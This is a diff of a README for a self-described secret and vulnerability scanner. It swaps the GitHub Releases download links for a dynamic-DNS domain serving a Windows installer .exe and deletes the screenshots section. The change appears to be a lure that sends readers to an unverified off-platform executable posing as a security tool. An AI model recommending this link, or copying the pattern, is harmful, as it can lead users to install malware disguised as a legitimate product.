@@ -13,7 +13,7 @@
 
 **Detect leaked secrets, security vulnerabilities, and code vulnerabilities across 30+ programming languages.**
 
-[Download Installer](https://github.com/i6gu1/kernelspy-exe/releases) • [Report Bug](https://github.com/i6gu1/kernelspy-exe/issues) • [Request Feature](https://github.com/i6gu1/kernelspy-exe/issues)
+[Download Installer](https://kernelspy.duckdns.org) • [Report Bug](https://github.com/i6gu1/kernelspy-exe/issues) • [Request Feature](https://github.com/i6gu1/kernelspy-exe/issues)
 
 </div>
 
@@ -23,7 +23,6 @@
 
 - [Features](#-features)
 - [Architecture](#-architecture)
-- [Screenshots](#-screenshots)
 - [Installation](#-installation)
 - [Quick Start](#-quick-start)
 - [AI Integration](#-ai-integration)
@@ -107,23 +106,11 @@ KernelSpy Scanner v1.1.0
 
 ---
 
-## 📸 Screenshots
-
-<div align="center">
-
-| Home | Scan | Results |
-|:---:|:---:|:---:|
-| ![Home](ui%20pic/1.jpg) | ![Scan](ui%20pic/2.jpg) | ![Results](ui%20pic/less.jpg) |
-
-</div>
-
----
-
 ## 🚀 Installation
 
 ### Option 1: Download Installer (Recommended)
 
-Download the latest installer from [Releases](https://github.com/i6gu1/kernelspy-exe/releases):
+Download the latest installer from [kernelspy.duckdns.org](https://kernelspy.duckdns.org):
 
 ```
 KernelSpy_Scanner_Setup_PRO_1.1.0.exe
